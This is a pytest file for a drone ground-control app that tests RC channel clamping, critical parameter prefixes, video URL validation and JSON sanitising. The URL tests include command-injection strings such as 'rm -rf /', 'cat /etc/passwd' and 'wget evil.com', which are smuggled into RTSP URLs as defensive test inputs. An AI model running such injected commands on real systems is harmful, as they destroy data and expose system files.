"""Tests for safety-critical validation logic in drone.py and main.py."""

import re
from drone import DroneConnection


# ===========================================================================
# RC Channel Validation  (_validate_rc_channels)
# ===========================================================================

class TestValidateRcChannels:
    """Tests for DroneConnection._validate_rc_channels static method.

    This method is safety-critical: it validates RC override PWM values
    before sending them to the vehicle. Incorrect clamping could cause
    uncontrolled flight.
    """

    # --- Basic valid inputs ---

    def test_normal_values_pass_through(self):
        result = DroneConnection._validate_rc_channels([1500, 1500, 1500, 1500])
        assert result == [1500, 1500, 1500, 1500, 0, 0, 0, 0]

    def test_boundary_low_1000(self):
        result = DroneConnection._validate_rc_channels([1000])
        assert result[0] == 1000

    def test_boundary_high_2000(self):
        result = DroneConnection._validate_rc_channels([2000])
        assert result[0] == 2000

    def test_midrange_values(self):
        channels = [1100, 1200, 1300, 1400, 1500, 1600, 1700, 1800]
        result = DroneConnection._validate_rc_channels(channels)
        assert result == channels

    # --- Zero passthrough (release) ---

    def test_zero_is_passthrough(self):
        """0 means 'release channel' in MAVLink RC_CHANNELS_OVERRIDE."""
        result = DroneConnection._validate_rc_channels([0, 0, 0, 0])
        assert result == [0, 0, 0, 0, 0, 0, 0, 0]

    def test_mix_of_zero_and_values(self):
        result = DroneConnection._validate_rc_channels([1500, 0, 1200, 0])
        assert result == [1500, 0, 1200, 0, 0, 0, 0, 0]

    # --- Clamping ---

    def test_below_1000_clamped_to_1000(self):
        result = DroneConnection._validate_rc_channels([500])
        assert result[0] == 1000

    def test_above_2000_clamped_to_2000(self):
        result = DroneConnection._validate_rc_channels([2500])
        assert result[0] == 2000

    def test_negative_nonzero_clamped_to_1000(self):
        result = DroneConnection._validate_rc_channels([-100])
        assert result[0] == 1000

    def test_just_below_1000_clamped(self):
        result = DroneConnection._validate_rc_channels([999])
        assert result[0] == 1000

    def test_just_above_2000_clamped(self):
        result = DroneConnection._validate_rc_channels([2001])
        assert result[0] == 2000

    def test_very_large_value_clamped(self):
        result = DroneConnection._validate_rc_channels([65535])
        assert result[0] == 2000

    # --- Padding ---

    def test_empty_list_padded_to_8_zeros(self):
        result = DroneConnection._validate_rc_channels([])
        assert result == [0, 0, 0, 0, 0, 0, 0, 0]

    def test_fewer_than_8_padded(self):
        result = DroneConnection._validate_rc_channels([1500, 1600])
        assert len(result) == 8
        assert result == [1500, 1600, 0, 0, 0, 0, 0, 0]

    def test_exactly_8_no_padding_needed(self):
        channels = [1500] * 8
        result = DroneConnection._validate_rc_channels(channels)
        assert len(result) == 8
        assert result == channels

    def test_more_than_8_truncated(self):
        channels = [1500] * 12
        result = DroneConnection._validate_rc_channels(channels)
        assert len(result) == 8

    def test_result_always_has_exactly_8_elements(self):
        for n in range(0, 12):
            result = DroneConnection._validate_rc_channels([1500] * n)
            assert len(result) == 8, f"Expected 8 elements for input length {n}, got {len(result)}"

    # --- Non-numeric handling ---

    def test_string_value_becomes_zero(self):
        result = DroneConnection._validate_rc_channels(["abc"])
        assert result[0] == 0

    def test_none_value_becomes_zero(self):
        result = DroneConnection._validate_rc_channels([None])
        assert result[0] == 0

    def test_float_value_converted_to_int(self):
        result = DroneConnection._validate_rc_channels([1500.7])
        assert result[0] == 1500
        assert isinstance(result[0], int)

    def test_string_numeric_value_converted(self):
        result = DroneConnection._validate_rc_channels(["1500"])
        assert result[0] == 1500

    def test_mixed_types(self):
        result = DroneConnection._validate_rc_channels([1500, "bad", None, 0, 1200])
        assert result == [1500, 0, 0, 0, 1200, 0, 0, 0]

    # --- All outputs are int ---

    def test_all_outputs_are_int(self):
        result = DroneConnection._validate_rc_channels([1500.5, "1200", 0, None, 1800])
        for i, val in enumerate(result):
            assert isinstance(val, int), f"Channel {i} is {type(val).__name__}, expected int"


# ===========================================================================
# Critical Parameter Prefix Detection
# ===========================================================================

class TestCriticalParamPrefixes:
    """Test the CRITICAL_PARAM_PREFIXES dict from main.py.

    We import it directly and verify that the prefix-matching logic
    used in api_params_set works correctly.
    """

    # Import the constant. This is a module-level dict, safe to import.
    # We replicate the matching logic from main.py here to avoid importing
    # the full FastAPI app (which has heavy dependencies).
    CRITICAL_PARAM_PREFIXES = {
        "BATT_": "battery",
        "FS_": "failsafe",
        "ARMING_": "arming checks",
        "MOT_": "motors",
        "INS_": "inertial sensors",
    }

    def _is_critical(self, param_id: str) -> tuple:
        """Replicate the prefix check from api_params_set."""
        param_upper = param_id.upper()
        for prefix, category in self.CRITICAL_PARAM_PREFIXES.items():
            if param_upper.startswith(prefix):
                return True, category
        return False, None

    # --- Matches ---

    def test_battery_param_is_critical(self):
        is_crit, category = self._is_critical("BATT_CAPACITY")
        assert is_crit is True
        assert category == "battery"

    def test_failsafe_param_is_critical(self):
        is_crit, category = self._is_critical("FS_THR_ENABLE")
        assert is_crit is True
        assert category == "failsafe"

    def test_arming_param_is_critical(self):
        is_crit, category = self._is_critical("ARMING_CHECK")
        assert is_crit is True
        assert category == "arming checks"

    def test_motor_param_is_critical(self):
        is_crit, category = self._is_critical("MOT_BAT_VOLT_MAX")
        assert is_crit is True
        assert category == "motors"

    def test_ins_param_is_critical(self):
        is_crit, category = self._is_critical("INS_GYROFFS_X")
        assert is_crit is True
        assert category == "inertial sensors"

    # --- Case insensitivity ---

    def test_lowercase_param_still_detected(self):
        is_crit, _ = self._is_critical("batt_capacity")
        assert is_crit is True

    def test_mixed_case_param_detected(self):
        is_crit, _ = self._is_critical("Fs_Thr_Enable")
        assert is_crit is True

    # --- Non-critical params ---

    def test_regular_param_not_critical(self):
        is_crit, _ = self._is_critical("WPNAV_SPEED")
        assert is_crit is False

    def test_servo_param_not_critical(self):
        is_crit, _ = self._is_critical("SERVO1_MAX")
        assert is_crit is False

    def test_empty_string_not_critical(self):
        is_crit, _ = self._is_critical("")
        assert is_crit is False

    def test_partial_prefix_not_critical(self):
        """'BAT' is not the same as 'BATT_'."""
        is_crit, _ = self._is_critical("BAT_SOMETHING")
        assert is_crit is False

    def test_prefix_must_be_at_start(self):
        """'X_BATT_Y' should NOT match since BATT_ is not at the start."""
        is_crit, _ = self._is_critical("X_BATT_Y")
        assert is_crit is False


# ===========================================================================
# Video URL Validation
# ===========================================================================

class TestVideoUrlValidation:
    """Test the video URL validation logic from main.py.

    We replicate the regex and validation constants to test the logic
    without importing the full FastAPI app.
    """

    _SHELL_METACHAR_RE = re.compile(r'[;|&`$(){}]')
    _ALLOWED_SCHEMES = {"rtsp", "http", "https", "udp"}
    _MAX_URL_LENGTH = 2048

    def _validate_url(self, url: str) -> tuple:
        """Replicate the URL validation from video_stream endpoint.
        Returns (valid, error_message).
        """
        import urllib.parse

        if not url:
            return False, "No URL provided"

        if len(url) > self._MAX_URL_LENGTH:
            return False, "URL too long"

        if self._SHELL_METACHAR_RE.search(url):
            return False, "Disallowed characters"

        parsed = urllib.parse.urlparse(url)
        if parsed.scheme not in self._ALLOWED_SCHEMES:
            return False, "Unsupported scheme"
        if not parsed.hostname:
            return False, "No hostname"

        return True, None

    # --- Valid URLs ---

    def test_rtsp_url_valid(self):
        valid, _ = self._validate_url("rtsp://192.168.1.100:8554/stream")
        assert valid is True

    def test_http_url_valid(self):
        valid, _ = self._validate_url("http://camera.local:8080/video")
        assert valid is True

    def test_https_url_valid(self):
        valid, _ = self._validate_url("https://camera.local/video")
        assert valid is True

    def test_udp_url_valid(self):
        valid, _ = self._validate_url("udp://0.0.0.0:14550")
        assert valid is True

    # --- Invalid schemes ---

    def test_ftp_scheme_rejected(self):
        valid, err = self._validate_url("ftp://evil.com/file")
        assert valid is False
        assert "scheme" in err.lower()

    def test_file_scheme_rejected(self):
        valid, err = self._validate_url("file:///etc/passwd")
        assert valid is False

    def test_javascript_scheme_rejected(self):
        valid, err = self._validate_url("javascript:alert(1)")
        assert valid is False

    # --- Shell injection prevention ---

    def test_semicolon_rejected(self):
        valid, err = self._validate_url("rtsp://host; rm -rf /")
        assert valid is False
        assert "character" in err.lower()

    def test_pipe_rejected(self):
        valid, err = self._validate_url("rtsp://host | cat /etc/passwd")
        assert valid is False

    def test_ampersand_rejected(self):
        valid, err = self._validate_url("rtsp://host & wget evil.com")
        assert valid is False

    def test_backtick_rejected(self):
        valid, err = self._validate_url("rtsp://host`id`")
        assert valid is False

    def test_dollar_rejected(self):
        valid, err = self._validate_url("rtsp://host$(id)")
        assert valid is False

    def test_curly_braces_rejected(self):
        valid, err = self._validate_url("rtsp://host{evil}")
        assert valid is False

    # --- Length and empty ---

    def test_empty_url_rejected(self):
        valid, _ = self._validate_url("")
        assert valid is False

    def test_url_over_max_length_rejected(self):
        long_url = "http://host/" + "a" * 2048
        valid, err = self._validate_url(long_url)
        assert valid is False
        assert "long" in err.lower()

    def test_url_at_max_length_valid(self):
        # Create a URL that is exactly 2048 chars
        base = "http://host/"
        padding = "a" * (2048 - len(base))
        url = base + padding
        assert len(url) == 2048
        valid, _ = self._validate_url(url)
        assert valid is True

    # --- No hostname ---

    def test_scheme_only_no_hostname_rejected(self):
        valid, err = self._validate_url("http://")
        assert valid is False


# ===========================================================================
# sanitize_for_json
# ===========================================================================

class TestSanitizeForJson:
    """Test the sanitize_for_json helper from drone.py."""

    def test_nan_becomes_none(self):
        from drone import sanitize_for_json
        assert sanitize_for_json(float('nan')) is None

    def test_inf_becomes_none(self):
        from drone import sanitize_for_json
        assert sanitize_for_json(float('inf')) is None

    def test_neg_inf_becomes_none(self):
        from drone import sanitize_for_json
        assert sanitize_for_json(float('-inf')) is None

    def test_normal_float_unchanged(self):
        from drone import sanitize_for_json
        assert sanitize_for_json(3.14) == 3.14

    def test_int_unchanged(self):
        from drone import sanitize_for_json
        assert sanitize_for_json(42) == 42

    def test_string_unchanged(self):
        from drone import sanitize_for_json
        assert sanitize_for_json("hello") == "hello"

    def test_none_unchanged(self):
        from drone import sanitize_for_json
        assert sanitize_for_json(None) is None

    def test_dict_with_nan_values(self):
        from drone import sanitize_for_json
        result = sanitize_for_json({"a": 1, "b": float('nan'), "c": "ok"})
        assert result == {"a": 1, "b": None, "c": "ok"}

    def test_nested_dict(self):
        from drone import sanitize_for_json
        result = sanitize_for_json({"outer": {"inner": float('inf')}})
        assert result == {"outer": {"inner": None}}

    def test_list_with_nan(self):
        from drone import sanitize_for_json
        result = sanitize_for_json([1.0, float('nan'), 3.0])
        assert result == [1.0, None, 3.0]

    def test_tuple_with_nan(self):
        from drone import sanitize_for_json
        result = sanitize_for_json((float('nan'), 2.0))
        assert result == [None, 2.0]
